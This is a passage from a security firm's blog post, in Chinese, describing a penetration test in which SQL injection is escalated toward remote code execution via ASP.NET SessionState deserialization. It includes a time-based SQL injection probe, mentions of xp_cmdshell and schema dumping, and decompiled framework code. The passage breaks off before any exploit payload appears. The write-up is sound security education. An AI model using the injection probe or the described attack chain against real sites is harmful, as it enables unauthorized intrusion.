

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式 | DEVCORE 戴夫寇爾</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="SQL injection 不是最高權限，還有什麼樣的方式可以拿到 RCE？利用 SessionState 反序列化攻擊。" />
    <meta name="keywords" content="Deserialize, DEVCORE CONF" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式 | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20200421/cover.jpg" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式 | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="SQL injection 不是最高權限，還有什麼樣的方式可以拿到 RCE？利用 SessionState 反序列化攻擊。">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20200421/cover.jpg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body>
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>服務<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    紅隊演練
                                </h2>
                                <p class="two-line">
                                    在不影響企業營運前提下，無所不用其極，從各種進入點執行模擬入侵攻擊，達成企業指定的演練情境。
                                </p>
                            </div>
                        </a>
                        <a href="/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    滲透測試
                                </h2>
                                <p class="two-line">
                                    以駭客思維及手法嘗試入侵企業指定系統，找出潛在漏洞，驗證企業資料與設備是否可被竊取或破壞。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    資安顧問服務
                                </h2>
                                <p class="two-line">
                                    以紅隊演練為基礎，提供攻擊者視角與可能入侵路徑，協助企業評估資安資源優先順序，並擬定長期防禦策略。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    資安教育訓練
                                </h2>
                                <p class="two-line">
                                    從攻擊思維出發，協助企業有效預防資安事故並防禦；以及事件發生時，如何快速判定攻擊目的、手法、漏洞與及應變方式。
                                </p>
                            </div>
                        </a>

                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>研究<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    總覽概要
                                </h2>
                                <p class="two-line">
                                    持續精研資安最新技術及漏洞研究趨勢，全方位檢測企業產品安全性、吸取經驗並轉化為紅隊演練工具與手法。
                                </p>
                            </div>
                        </a>
                        <a href="/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    競賽與獎項
                                </h2>
                                <p class="two-line">
                                    國際級資訊安全競賽獎項肯定。
                                </p>
                            </div>
                        </a>
                        <a href="/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    企業漏洞回報
                                </h2>
                                <p class="two-line">
                                    研究企業系統中的資安風險及各種可能的突破口，並通報企業修補。
                                </p>
                            </div>
                        </a>
                        <a href="/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    國際研討會
                                </h2>
                                <p class="two-line">
                                    參與全球資安盛會，發表、交流漏洞的知識與資訊。
                                </p>
                            </div>
                        </a>
                        <a href="/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE 漏洞列表
                                </h2>
                                <p class="two-line">
                                    挖掘並回報國際知名產品與服務的重大漏洞。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>公司<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                公司簡介
                            </h2>
                            <p>
                                DEVCORE 戴夫寇爾由世界級白帽駭客團隊創立，提供紅隊演練、滲透測試、資安顧問服務、資安教育訓練等服務。
                            </p>
                        </div>
                        </a>
                        <a href="/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    團隊成員
                                </h2>
                                <p class="two-line">
                                    由熱衷挑戰、具備駭客思維的資安專家組成，專注於創新攻擊手法研究，並以「高道德、高自律、高嚴謹」為最高指導原則。
                                </p>
                            </div>
                        </a>
                        <a href="/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    成就與沿革
                                </h2>
                                <p class="two-line">
                                    長期聚焦於攻擊研究，屢屢獲邀參與全球知名資安研討會，已揭露數百個重要產品漏洞、協助企業提升防禦能量。
                                </p>
                            </div>
                        </a>
                        <a href="/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    企業社會責任
                                </h2>
                                <p class="two-line">
                                    提供多元實習管道和研習計畫，提升新世代人才資安能量，推廣資訊安全意識。
                                </p>
                            </div>
                        </a>
                        <a href="/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    工作機會
                                </h2>
                                <p class="two-line">
                                    加入 DEVCORE，共同改善資安產業結構，與我們一起打造更安全的世界。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>新聞<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    DEVCORE 最新消息。
                                </p>
                            </div>
                        </a>
                        <a href="/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    媒體素材下載
                                </h2>
                                <p>
                                    使用 DEVCORE 商標須遵循的使用規範。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/search/">搜尋</a>
            </li>
            <li>
                <a class="menuLable" href="/contact/">聯絡我們</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>服務</span>
                <div class="menuItem">
                    <a href="/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                紅隊演練
                            </h2>
                        </div>
                    </a>
                    <a href="/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                滲透測試
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                顧問服務
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                教育訓練
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>資安研究</span>
                <div class="menuItem">
                    <a href="/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>總覽概要</h2>
                        </div>
                    </a>
                    <a href="/research/awards/">
                        <div class="item">
                            <h2>競賽與獎項</h2>
                        </div>
                    </a>
                    <a href="/research/bug-bounty/">
                        <div class="item">
                            <h2>Bug Bounty</h2>
                        </div>
                    </a>
                    <a href="/research/talks/">
                        <div class="item">
                            <h2>國際研討會</h2>
                        </div>
                    </a>
                    <a href="/research/cve/">
                        <div class="item">
                            <h2>CVE 漏洞列表</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>公司</span>
                <div class="menuItem">
                    <a href="/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>公司簡介</h2>
                        </div>
                    </a>
                    <a href="/company/our-team/">
                        <div class="item">
                            <h2>團隊成員</h2>
                        </div>
                    </a>
                    <a href="/company/history/">
                        <div class="item">
                            <h2>成就與沿革</h2>
                        </div>
                    </a>
                    <a href="/company/csr/">
                        <div class="item">
                            <h2>企業社會責任</h2>
                        </div>
                    </a>
                    <a href="/company/jobs/">
                        <div class="item">
                            <h2>工作機會</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>新聞</span>
                <div class="menuItem">
                    <!-- <a href="/blog/">
                    <div class="item">
                        <h2>所有文章</h2>
                    </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>案例剖析</h2>
                        </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>科普文章</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>技術專欄</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>資安新聞</h2>
                        </div>
                    </a> -->
                    <a href="/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/media-kit/">
                        <div class="item">
                            <h2>媒體素材下載</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                搜尋
                            </h2>
                        </div>
                    </a>
                    <a href="/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                聯絡我們
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/blog/">所有文章</a>
                </li>
                <li>
                    <a href="/blog/category/最新消息/">最新消息</a>
                </li>
                <li>
                    <a href="/blog/category/技術專欄/">技術專欄</a>
                </li>
                <li>
                    <a href="/blog/category/科普文章/">科普文章</a>
                </li>
                <li>
                    <a href="/blog/category/資安新聞/">資安新聞</a>
                </li>
                <li>
                    <a href="/media-kit/">媒體素材下載</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                    <span class="tag">

                      <a href="/blog/tag/DEVCORE CONF/">#DEVCORE CONF</a> <a href="/blog/tag/Deserialize/">#Deserialize</a> 
                    </span>
                    <h1>
                        從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/blog/author/cyku">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/cyku.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/blog/author/cyku">Cyku</a></span>
                        <span class="date">2020-04-21</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20200421/cover.jpg"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<p>今日來聊聊在去年某次滲透測試過中發現的趣事，那是在一個風和日麗的下午，與往常一樣進行著枯燥的測試環節，對每個參數嘗試各種可能的注入，但遲遲沒有任何進展和突破，直到在某個頁面上注入 <code class="language-plaintext highlighter-rouge">?id=1; waitfor delay '00:00:05'--</code>，然後他就卡住了，過了恰好 5 秒鐘後伺服器又有回應，這表示我們找到一個 SQL Server 上的 SQL Injection！</p>

<p>一些陳舊、龐大的系統中，因為一些複雜的因素，往往仍使用著 sa 帳戶來登入 SQL Server，而在有如此高權限的資料庫帳戶前提下，我們可以輕易利用 xp_cmdshell 來執行系統指令以取得資料庫伺服器的作業系統控制權，但假如故事有如此順利，就不會出現這篇文章，所以理所當然我們取得的資料庫帳戶並沒有足夠權限。但因為發現的 SQL Injection 是 Stacked based，我們仍然可以對資料表做 CRUD，運氣好控制到一些網站設定變數的話，甚至可以直接達成 RCE，所以還是試著 dump schema 以了解架構，而在 dump 過程中發現了一個有趣的資料庫：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database: ASPState
[2 tables]
+---------------------------------------+
| dbo.ASPStateTempApplications          |
| dbo.ASPStateTempSessions              |
+---------------------------------------+
</code></pre></div></div>

<p>閱讀文件後了解到，這個資料庫的存在用途是用來保存 ASP.NET 網站應用程式的 session。一般情況下預設 session 是儲存在 ASP.NET 網站應用程式的記憶體中，但某些分散式架構（例如 Load Balance 架構）的情況下，同時會有多個一模一樣的 ASP.NET 網站應用程式運行在不同伺服器主機上，而使用者每次請求時被分配到的伺服器主機也不會完全一致，就會需要有可以讓多個主機共享 session 的機制，而儲存在 SQL Server 上就是一種解決方案之一，想啟用這個機制可以在 web.config 中添加如下設定：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
    <span class="nt">&lt;system.web&gt;</span>
        <span class="c">&lt;!-- 將 session 保存在 SQL Server 中。 --&gt;</span>
        <span class="nt">&lt;sessionState</span>
            <span class="na">mode=</span><span class="s">"SQLServer"</span>
            <span class="na">sqlConnectionString=</span><span class="s">"data source=127.0.0.1;user id=&lt;username&gt;;password=&lt;password&gt;"</span>
            <span class="na">timeout=</span><span class="s">"20"</span>
        <span class="nt">/&gt;</span>
        
        <span class="c">&lt;!-- 預設值，將 session 保存在記憶體中。 --&gt;</span>
        <span class="c">&lt;!-- &lt;sessionState mode="InProc" timeout="20" /&gt; --&gt;</span>
 
        <span class="c">&lt;!-- 將 session 保存在 ASP.NET State Service 中，
             另一種跨主機共享 session 的解決方案。 --&gt;</span>
        <span class="c">&lt;!--
        &lt;sessionState
            mode="StateServer"
            stateConnectionString="tcpip=localhost:42424"
            timeout="20"
        /&gt;
        --&gt;</span>
    <span class="nt">&lt;/system.web&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
</code></pre></div></div>

<p>而要在資料庫中建立 ASPState 的資料庫，可以利用內建的工具 <code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe</code> 完成這個任務，只需要使用下述指令即可：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 建立 ASPState 資料庫</span>
aspnet_regsql.exe <span class="nt">-S</span> 127.0.0.1 <span class="nt">-U</span> sa <span class="nt">-P</span> password <span class="nt">-ssadd</span> <span class="nt">-sstype</span> p

<span class="c"># 移除 ASPState 資料庫</span>
aspnet_regsql.exe <span class="nt">-S</span> 127.0.0.1 <span class="nt">-U</span> sa <span class="nt">-P</span> password <span class="nt">-ssremove</span> <span class="nt">-sstype</span> p
</code></pre></div></div>

<p>現在我們了解如何設定 session 的儲存位置，且又可以控制 ASPState 資料庫，可以做到些什麼呢？這就是文章標題的重點，取得 Remote Code Execution！</p>

<p>ASP.NET 允許我們在 session 中儲存一些物件，例如儲存一個 List 物件：<code class="language-plaintext highlighter-rouge">Session["secret"] = new List&lt;String&gt;() { "secret string" };</code>，對於如何將這些物件保存到 SQL Server 上，理所當然地使用了<strong>序列化機制</strong>來處理，而我們又控制了資料庫，所以也能執行任意反序列化，為此需要先了解 Session 物件序列化與反序列化的過程。</p>

<p>簡單閱讀程式碼後，很快就可以定位出處理相關過程的類別，為了縮減說明的篇幅，以下將直接切入重點說明從資料庫取出資料後進行了什麼樣的反序列化操作。核心主要是透過呼叫 <code class="language-plaintext highlighter-rouge">SqlSessionStateStore.GetItem</code> 函式還原出 Session 物件，雖然已盡可能把無關緊要的程式碼移除，但行數還是偏多，如果懶得閱讀程式碼的朋友可以直接下拉繼續看文章說明 XD</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">System.Web.SessionState</span> <span class="p">{</span>
    <span class="k">internal</span> <span class="k">class</span> <span class="nc">SqlSessionStateStore</span> <span class="p">:</span> <span class="n">SessionStateStoreProviderBase</span> <span class="p">{</span>
        <span class="k">public</span> <span class="k">override</span> <span class="n">SessionStateStoreData</span>  <span class="nf">GetItem</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span>
                                                        <span class="n">String</span> <span class="n">id</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="kt">bool</span> <span class="n">locked</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="n">TimeSpan</span> <span class="n">lockAge</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="kt">object</span> <span class="n">lockId</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="n">SessionStateActions</span> <span class="n">actionFlags</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">SessionIDManager</span><span class="p">.</span><span class="nf">CheckIdLength</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="k">true</span> <span class="cm">/* throwOnFail */</span><span class="p">);</span>
            <span class="k">return</span> <span class="nf">DoGet</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">out</span> <span class="n">locked</span><span class="p">,</span> <span class="k">out</span> <span class="n">lockAge</span><span class="p">,</span> <span class="k">out</span> <span class="n">lockId</span><span class="p">,</span> <span class="k">out</span> <span class="n">actionFlags</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">SessionStateStoreData</span> <span class="nf">DoGet</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">String</span> <span class="n">id</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">getExclusive</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="kt">bool</span> <span class="n">locked</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="n">TimeSpan</span> <span class="n">lockAge</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="kt">object</span> <span class="n">lockId</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="n">SessionStateActions</span> <span class="n">actionFlags</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">SqlDataReader</span>       <span class="n">reader</span><span class="p">;</span>
            <span class="kt">byte</span> <span class="p">[]</span>             <span class="n">buf</span><span class="p">;</span>
            <span class="n">MemoryStream</span>        <span class="n">stream</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">SessionStateStoreData</span>    <span class="n">item</span><span class="p">;</span>
            <span class="n">SqlStateConnection</span>  <span class="n">conn</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">SqlCommand</span>          <span class="n">cmd</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="kt">bool</span>                <span class="n">usePooling</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>

            <span class="n">buf</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">reader</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">conn</span> <span class="p">=</span> <span class="nf">GetConnection</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="k">ref</span> <span class="n">usePooling</span><span class="p">);</span>

            <span class="k">try</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">getExclusive</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">cmd</span> <span class="p">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">TempGetExclusive</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">cmd</span> <span class="p">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">TempGet</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">id</span> <span class="p">+</span> <span class="n">_partitionInfo</span><span class="p">.</span><span class="n">AppSuffix</span><span class="p">;</span> <span class="c1">// @id</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">1</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @itemShort</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">2</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @locked</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">3</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @lockDate or @lockAge</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">4</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @lockCookie</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">5</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @actionFlags</span>

                <span class="k">using</span><span class="p">(</span><span class="n">reader</span> <span class="p">=</span> <span class="nf">SqlExecuteReaderWithRetry</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">CommandBehavior</span><span class="p">.</span><span class="n">Default</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">reader</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">try</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="n">reader</span><span class="p">.</span><span class="nf">Read</span><span class="p">())</span> <span class="p">{</span>
                                <span class="n">buf</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="n">reader</span><span class="p">[</span><span class="m">0</span><span class="p">];</span>
                            <span class="p">}</span>
                        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nf">ThrowSqlConnectionException</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">Connection</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">buf</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* Get short item */</span>
                    <span class="n">buf</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">using</span><span class="p">(</span><span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">item</span> <span class="p">=</span> <span class="n">SessionStateUtility</span><span class="p">.</span><span class="nf">DeserializeStoreData</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">stream</span><span class="p">,</span> <span class="n">s_configCompressionEnabled</span><span class="p">);</span>
                    <span class="n">_rqOrigStreamLen</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">stream</span><span class="p">.</span><span class="n">Position</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="n">item</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
                <span class="nf">DisposeOrReuseConnection</span><span class="p">(</span><span class="k">ref</span> <span class="n">conn</span><span class="p">,</span> <span class="n">usePooling</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        
        <span class="k">class</span> <span class="nc">SqlStateConnection</span> <span class="p">:</span> <span class="n">IDisposable</span> <span class="p">{</span>
            <span class="k">internal</span> <span class="n">SqlCommand</span> <span class="n">TempGet</span> <span class="p">{</span>
                <span class="k">get</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">_cmdTempGet</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">_cmdTempGet</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SqlCommand</span><span class="p">(</span><span class="s">"dbo.TempGetStateItem3"</span><span class="p">,</span> <span class="n">_sqlConnection</span><span class="p">);</span>
                        <span class="n">_cmdTempGet</span><span class="p">.</span><span class="n">CommandType</span> <span class="p">=</span> <span class="n">CommandType</span><span class="p">.</span><span class="n">StoredProcedure</span><span class="p">;</span>
                        <span class="n">_cmdTempGet</span><span class="p">.</span><span class="n">CommandTimeout</span> <span class="p">=</span> <span class="n">s_commandTimeout</span><span class="p">;</span>
                        <span class="c1">// ignore process of setting parameters</span>
                    <span class="p">}</span>
                    <span class="k">return</span> <span class="n">_cmdTempGet</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>我們可以從程式碼清楚看出主要是呼叫 <code class="language-plaintext highlighter-rouge">ASPState.dbo.TempGetStateItem3</code> Stored Procedure 取得 Session 的序列化二進制資料並保存到 buf 變數，最後將 buf 傳入 <code class="language-plaintext highlighter-rouge">SessionStateUtility.DeserializeStoreData</code> 進行反序列化還原出 Session 物件，而 TempGetStateItem3 這個 SP 則是相當於在執行 <code class="language-plaintext highlighter-rouge">SELECT SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions</code>，所以可以知道 Session 是儲存在 ASPStateTempSessions 資料表的 SessionItemShort 欄位中。接著讓我們繼續往下看關鍵的 DeserializeStoreData 做了什麼樣的操作。同樣地，行數偏多，有需求的朋友請自行下拉 XD</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">System.Web.SessionState</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">SessionStateUtility</span> <span class="p">{</span>

        <span class="p">[</span><span class="nf">SecurityPermission</span><span class="p">(</span><span class="n">SecurityAction</span><span class="p">.</span><span class="n">Assert</span><span class="p">,</span> <span class="n">SerializationFormatter</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
